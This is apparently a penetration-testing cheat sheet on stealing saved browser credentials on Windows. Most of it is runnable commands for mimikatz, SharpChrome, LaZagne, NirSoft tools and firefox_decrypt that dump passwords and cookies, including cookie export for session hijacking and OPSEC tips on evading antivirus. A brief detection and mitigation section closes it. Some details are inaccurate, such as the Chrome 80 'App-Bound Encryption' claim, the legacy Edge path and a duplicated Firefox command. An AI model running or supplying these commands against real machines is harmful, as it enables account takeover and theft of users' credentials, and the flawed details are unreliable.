# <span style="color:rgb(255, 192, 0)">Browser Credential Extraction</span>

Browsers store saved passwords, cookies, autofill data, and credit cards using OS-level encryption (DPAPI on Windows). Extracting these yields credentials for web applications (email, intranet, cloud consoles, VPN portals).

---

## <span style="color:rgb(255, 0, 0)">1. Chrome Credentials</span>

### Storage Location
```
Stored passwords:  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
Encryption key:    %LOCALAPPDATA%\Google\Chrome\User Data\Local State
Encryption method: DPAPI (master key), AES-256-GCM (Chrome 80+)
```

### Chrome < 80 (DPAPI Only)
```mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

### Chrome 80+ (App-Bound Encryption)
```mimikatz
# Requires the user's master key
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /masterkey:KEY
```

### SharpChrome (GhostPack)
```powershell
# Dump Chrome passwords
SharpChrome.exe logins

# Dump Chrome cookies
SharpChrome.exe cookies

# Dump Chrome history
SharpChrome.exe history

# Dump with specific master key
SharpChrome.exe logins /masterkey:KEY

# Dump from Chrome Beta/Canary
SharpChrome.exe logins /browser:chrome-beta
```

### Local State Encryption Key
```powershell
# Extract encrypted key from Local State
Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json | Select-Object -ExpandProperty os_crypt
```

### LaZagne
```bash
# Dump all browser passwords
lazagne.exe browsers

# Dump Chrome only
lazagne.exe browsers -p chrome
```

---

## <span style="color:rgb(0, 176, 240)">2. Firefox Credentials</span>

### Storage Location
```
Profiles:    %APPDATA%\Mozilla\Firefox\Profiles\*.default-release
Logins:      logins.json (encrypted)
Key file:    key4.db (master key)
```

### Firefox uses its own encryption (PKCS11/NSS)
```bash
# Use firefox_decrypt.py (Python, works on all OS)
python3 firefox_decrypt.py %APPDATA%\Mozilla\Firefox\Profiles\*.default-release

# Alternatively, with master password prompt
python3 firefox_decrypt.py %APPDATA%\Mozilla\Firefox\Profiles\*.default-release
```

### LaZagne
```bash
lazagne.exe browsers -p firefox
```

### Manual Extraction
```python
# logins.json structure
{
    "logins": [
        {
            "hostname": "https://example.com",
            "encryptedUsername": "...",
            "encryptedPassword": "...",
            "encType": 1
        }
    ]
}
```
The `encryptedUsername` and `encryptedPassword` fields are base64-encoded and encrypted with TripleDES using the master key from `key4.db`.

---

## <span style="color:rgb(146, 208, 80)">3. Edge Credentials</span>

### Storage Location (Chromium-based Edge)
```
Stored passwords:  %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
Encryption key:    %LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
```

### Extraction
```bash
# Same as Chrome — uses DPAPI/AES-256-GCM
SharpChrome.exe logins /browser:edge

# Or copy Login Data and Local State files for offline analysis
copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" C:\temp\
copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State" C:\temp\
```

### Legacy Edge (EdgeHTML)
```
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Web Data
```
Uses Windows Credential Manager directly.

---

## <span style="color:rgb(112, 48, 160)">4. Internet Explorer Credentials</span>

### Storage
```
%APPDATA%\Microsoft\Internet Explorer\
Windows Credential Manager (for saved web passwords)
```

### Extraction
```powershell
# IE passwords are stored in Credential Manager
cmdkey /list

# And in registry:
reg query HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\IntelliForms\Storage2
```

### LaZagne
```bash
lazagne.exe browsers -p ie
```

---

## <span style="color:rgb(0, 32, 96)">5. Offline Browser Extraction</span>

### Copy Chrome Login Data
```cmd
# Must copy while Chrome is closed (file is locked otherwise)
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\temp\
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" C:\temp\
```

### Offline Decryption with Python
```bash
# decrypt_chrome.py
pip install pycryptodome
python3 decrypt_chrome.py -d C:\temp\Login Data -s C:\temp\Local State
```

### Copy Firefox Profile
```cmd
# Copy entire profile for offline analysis
xcopy /E /I "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release" C:\temp\firefox_profile\
```

```bash
# Offline Firefox decryption
python3 firefox_decrypt.py C:\temp\firefox_profile\
```

---

## <span style="color:rgb(94, 18, 18)">6. Comprehensive Tools</span>

### LaZagne
```bash
# Dump all browsers
lazagne.exe all

# Dump browsers only
lazagne.exe browsers

# With specific output format
lazagne.exe browsers -oN    # Normal
lazagne.exe browsers -oJ    # JSON
lazagne.exe browsers -oCSV  # CSV
```

### SharpChrome (GhostPack)
```powershell
# All Chrome/Edge/Firefox data
SharpChrome.exe logins /browser:all

# Export cookies for session hijacking
SharpChrome.exe cookies /browser:chrome
```

### WebBrowserPassView (NirSoft)
```cmd
# GUI tool for all browsers
WebBrowserPassView.exe /stext passwords.txt
```

### BrowserPassView (NirSoft)
```cmd
BrowserPassView.exe /stext passwords.txt
```

---

## <span style="color:rgb(255, 255, 0)">7. OPSEC & Detection</span>

| Consideration | Detail |
|---------------|--------|
| File locks | Chrome/Edge lock Login Data while running; kill process first |
| Master password | Firefox master password blocks decryption |
| Chrome 80+ | App-bound encryption requires user context or master key |
| Corporate sync | Chrome sync may have enterprise policy restricting local storage |
| AV/EDR | SharpChrome and LaZagne are signatured |
| File access | Opening `Login Data` triggers file handle events |

### Detection
```
Event 4663: Handle to Login Data, key4.db, logins.json
Process accessing browser data directories not from browser binary
```

### Mitigations
| Control | Effect |
|---------|--------|
| Disable password saving | GPO: "Do not allow saving credentials" |
| Enterprise Chrome policy | `PasswordManagerEnabled = false` |
| DPAPI encryption | Remove domain DPAPI backup key access |
| WDAC/AppLocker | Block SharpChrome, LaZagne, non-signed binaries |
| EDR | Alert on DPAPI calls from unusual processes |
